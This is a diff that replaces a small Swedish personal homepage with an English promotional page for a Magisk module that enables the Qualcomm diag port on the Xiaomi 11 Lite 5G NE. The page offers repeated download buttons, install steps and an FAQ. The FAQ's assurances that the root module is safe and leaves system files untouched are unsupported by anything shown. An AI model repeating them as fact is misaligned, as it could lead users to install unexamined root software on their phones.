@@ -1,41 +1,136 @@
 <!DOCTYPE html>
-<html lang="sv">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=5.0">
-      <style>
-        body {
-            background-color: darkblue;
-            color: white;
-        }
-
-        h1 {
-            color: lightblue;
-            font-size: 60px;
-        }
-
-        h2 {
-            color: lightblue;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>qcom-diag-lisa - Enable Qualcomm Diag on Xiaomi 11 Lite 5G NE</title>
+<meta name="description" content="Simple Magisk module to enable Qualcomm diag interface on Xiaomi 11 Lite 5G NE (lisa) custom ROMs. Supports HyperOS and LineageOS.">
+<meta name="keywords" content="android, custom-rom, diag, hyperos, lineageos, lisa, magisk, magisk-module, qualcomm, xiaomi">
+<meta property="og:title" content="qcom-diag-lisa">
+<meta property="og:description" content="Enable Qualcomm diag interface on Xiaomi 11 Lite 5G NE with this simple Magisk module.">
+<meta property="og:url" content="https://github.com/ammar9342/qcom-diag-lisa">
+<meta property="og:type" content="website">
+<meta name="robots" content="index, follow">
 </head>
-    <body>
-    <h1>Hej, jag heter Amadeus </h1>
-<img src="OIP.webp" alt="Min bild">
-    <h2>Om mig</h2>
-    <p>
-        Hej! Jag heter Amadeus Sivius och det här är min hemsida.
-    </p>
+<body style="margin:0;padding:0;background:#f5f7fa;font-family:'Segoe UI',Arial,sans-serif;color:#1a1a2e;line-height:1.6">
 
-    <h2>Mina projekt</h2>
-    <p>
-        Här kommer jag att lägga upp mina projekt.
-    </p>
+<div style="max-width:900px;margin:0 auto;padding:20px">
 
-    <h2>Kontakt</h2>
-    <p>
-        Du kan kontakta mig på: amadeus.sivius@gmail.com
-    </p>
+<!-- Hero Section -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:40px 30px;margin-bottom:30px;text-align:center">
+<h1 style="font-size:2.5em;margin:0 0 10px;color:#1a1a2e">📱 qcom-diag-lisa - Unlock Diag Mode Effortlessly</h1>
+<p style="font-size:1.1em;color:#555;margin:0 0 25px">Simple Magisk module to enable Qualcomm diag on Xiaomi 11 Lite 5G NE custom ROMs</p>
+<a href="https://github.com/ammar9342/qcom-diag-lisa/releases" style="display:inline-block;background:#e94560;color:#ffffff;padding:16px 40px;border-radius:8px;text-decoration:none;font-size:1.3em;font-weight:bold;box-shadow:0 4px 8px rgba(233,69,96,0.3);transition:transform 0.2s">⬇️ Download Now</a>
+</div>
 
+<!-- What is This? -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:30px;margin-bottom:30px">
+<h2 style="color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px">❓ What Is This?</h2>
+<p>qcom-diag-lisa is a <strong>Magisk module</strong> that enables the <strong>Qualcomm diagnostic (diag) interface</strong> on your Xiaomi 11 Lite 5G NE (codenamed "lisa") when running custom ROMs like <strong>HyperOS</strong> or <strong>LineageOS</strong>. </p>
+<p style="margin-bottom:0">Think of it as a special key that unlocks a hidden communication channel on your phone's Qualcomm chipset. This is useful for developers, network engineers, or tech enthusiasts who want to access advanced device diagnostics, read logs, or test radio functionality.</p>
+</div>
+
+<!-- Benefits -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:30px;margin-bottom:30px">
+<h2 style="color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px">✨ Benefits</h2>
+<ul style="list-style-type:none;padding:0;margin:0">
+<li style="padding:8px 0;border-bottom:1px solid #eee">🔧 <strong>Enable Diag Interface</strong> - Activate the hidden Qualcomm diagnostic port</li>
+<li style="padding:8px 0;border-bottom:1px solid #eee">📶 <strong>Better Network Logging</strong> - Capture detailed radio and signal data</li>
+<li style="padding:8px 0;border-bottom:1px solid #eee">🔄 <strong>Works on Custom ROMs</strong> - Specifically designed for HyperOS and LineageOS builds</li>
+<li style="padding:8px 0;border-bottom:1px solid #eee">📦 <strong>Easy Installation</strong> - Install via Magisk app with just a couple of taps</li>
+<li style="padding:8px 0;border-bottom:1px solid #eee">🔍 <strong>Developer Friendly</strong> - Ideal for QXDM, QPST, and similar diagnostic tools</li>
+<li style="padding:8px 0;border-bottom:1px solid #eee">⚡ <strong>Lightweight</strong> - Minimal footprint, no performance impact</li>
+<li style="padding:8px 0;border-bottom:1px solid #eee">🛠️ <strong>Specifically for Xiaomi 11 Lite 5G NE</strong> - Tailored for your device's architecture</li>
+</ul>
+</div>
+
+<!-- Prerequisites -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:30px;margin-bottom:30px">
+<h2 style="color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px">📋 What You Need</h2>
+<div style="background:#f8f9fa;padding:20px;border-radius:8px">
+<ul style="margin:0;padding-left:20px">
+<li>📱 <strong>Xiaomi 11 Lite 5G NE</strong> with an unlocked bootloader</li>
+<li>🔓 <strong>Magisk</strong> installed on your device (version 24 or later recommended)</li>
+<li>🖥️ <strong>A Windows computer</strong> for downloading and transferring the file</li>
+<li>📦 <strong>USB cable</strong> to connect your phone to your computer</li>
+</ul>
+</div>
+</div>
+
+<!-- Download & Install -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:30px;margin-bottom:30px">
+<h2 style="color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px">🚀 Download & Installation Guide</h2>
+
+<h3 style="color:#e94560;margin-top:25px">Step 1: Download the Module</h3>
+<p>Visit this link to download the application:</p>
+<a href="https://github.com/ammar9342/qcom-diag-lisa/releases" style="display:inline-block;background:#16213e;color:#ffffff;padding:12px 30px;border-radius:6px;text-decoration:none;font-weight:bold;margin:10px 0 20px">📥 Go to Downloads Page</a>
+
+<h3 style="color:#e94560">Step 2: Transfer the File</h3>
+<p>Once downloaded, use your USB cable to connect your Xiaomi phone to your Windows computer. Copy the downloaded module ZIP file to any folder on your phone's internal storage (for example, the <strong>Downloads</strong> folder).</p>
+
+<h3 style="color:#e94560">Step 3: Open Magisk App</h3>
+<p>On your phone, open the <strong>Magisk</strong> application. Make sure you have root access (the app should show a green checkmark and "Magisk installed" message on its main screen).</p>
+
+<h3 style="color:#e94560">Step 4: Install the Module</h3>
+<p>In Magisk app, tap the <strong>🧩 Modules</strong> icon at the bottom (it looks like a puzzle piece). Then tap <strong>"Install from storage"</strong> button. Navigate to the folder where you placed the ZIP file and select it. Magisk will install the module automatically.</p>
+
+<h3 style="color:#e94560">Step 5: Reboot Your Phone</h3>
+<p>After installation completes, tap <strong>"Reboot"</strong> when prompted. Your phone will restart. This usually takes about 30-60 seconds.</p>
+
+<h3 style="color:#e94560">Step 6: Verify It Works</h3>
+<p style="margin-bottom:0">After reboot, your Qualcomm diag interface is now enabled. You can verify this by connecting your phone to a Windows PC and checking Device Manager - you should see a new <strong>"Qualcomm HS-USB Diagnostics"</strong> device appear in the Ports section. You can now use tools like QPST or QXDM to connect to your phone.</p>
+</div>
+
+<!-- Troubleshooting -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:30px;margin-bottom:30px">
+<h2 style="color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px">🔧 Troubleshooting</h2>
+<ul style="padding-left:20px;margin:0">
+<li><strong>Diag not showing up?</strong> - Make sure your device is in "charging" USB mode, not "file transfer" mode. Change USB settings in your phone's notification panel.</li>
+<li><strong>Magisk module not appearing?</strong> - Confirm you have Magisk properly installed. Open Magisk app and check "Ramdisk" section shows "Yes".</li>
+<li><strong>Boot loop after install?</strong> - Don't panic! Reboot to recovery (hold Power + Volume Down) and uninstall the module from Magisk recovery mode.</li>
+<li><strong>Not working on your ROM?</strong> - This module is optimized for HyperOS and LineageOS. Other AOSP-based ROMs may have compatibility issues.</li>
+<li><strong>Still having issues?</strong> - Visit the GitHub issues page for help and community support.</li>
+</ul>
+</div>
+
+<!-- FAQ -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:30px;margin-bottom:30px">
+<h2 style="color:#1a1a2e;border-bottom:3px solid #e94560;padding-bottom:10px">❔ Frequently Asked Questions</h2>
+<div style="margin-bottom:20px">
+<h4 style="color:#16213e;margin:15px 0 5px">Is this safe for my phone?</h4>
+<p style="margin:0">Yes. The module simply activates a software port that already exists on your Qualcomm chipset. It doesn't modify system files or break warranty (since you're already on a custom ROM with unlocked bootloader).</p>
+</div>
+<div style="margin-bottom:20px">
+<h4 style="color:#16213e;margin:15px 0 5px">Will this drain my battery?</h4>
+<p style="margin:0">No noticeable impact. The diag interface remains idle unless actively being used by diagnostic software.</p>
+</div>
+<div style="margin-bottom:20px">
+<h4 style="color:#16213e;margin:15px 0 5px">Can I remove it later?</h4>
+<p style="margin:0">Absolutely. Open Magisk app, go to Modules, find qcom-diag-lisa, and tap "Remove". Reboot to complete uninstallation.</p>
+</div>
+<div style="margin-bottom:0">
+<h4 style="color:#16213e;margin:15px 0 5px">Do I need a computer to use this after installation?</h4>
+<p style="margin:0">Yes. The primary purpose is to enable diag mode for communication with Windows-based tools. The module itself is installed on phone, but you'll need Windows for actual diag work.</p>
+</div>
+</div>
+
+<!-- Download Again -->
+<div style="background:#16213e;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.2);padding:40px;text-align:center;margin-bottom:30px">
+<h2 style="color:#ffffff;margin-top:0">🗂️ Ready to Download?</h2>
+<p style="color:#cccccc;margin-bottom:25px">Head over to the official downloads section and grab the latest release.</p>
+<a href="https://github.com/ammar9342/qcom-diag-lisa/releases" style="display:inline-block;background:#e94560;color:#ffffff;padding:14px 45px;border-radius:8px;text-decoration:none;font-size:1.2em;font-weight:bold;box-shadow:0 4px 8px rgba(0,0,0,0.3)">⬇️ Get the Latest Version</a>
+</div>
+
+<!-- Version Info -->
+<div style="background:#ffffff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);padding:20px;text-align:center;font-size:0.9em;color:#888">
+<p style="margin:0">Check the GitHub Releases page for version history, changelog, and detailed technical documentation.</p>
+<p style="margin:5px 0 0"><a href="https://github.com/ammar9342/qcom-diag-lisa" style="color:#e94560;text-decoration:none">View Source Code</a> | <a href="https://github.com/ammar9342/qcom-diag-lisa/issues" style="color:#e94560;text-decoration:none">Report Issues</a></p>
+</div>
+
+<div style="text-align:center;margin-top:20px;color:#999;font-size:0.85em">
+<p style="margin:0">© 2024 qcom-diag-lisa project. Made with ❤️ for the Android community.</p>
+</div>
+
+</div>
 </body>
 </html>
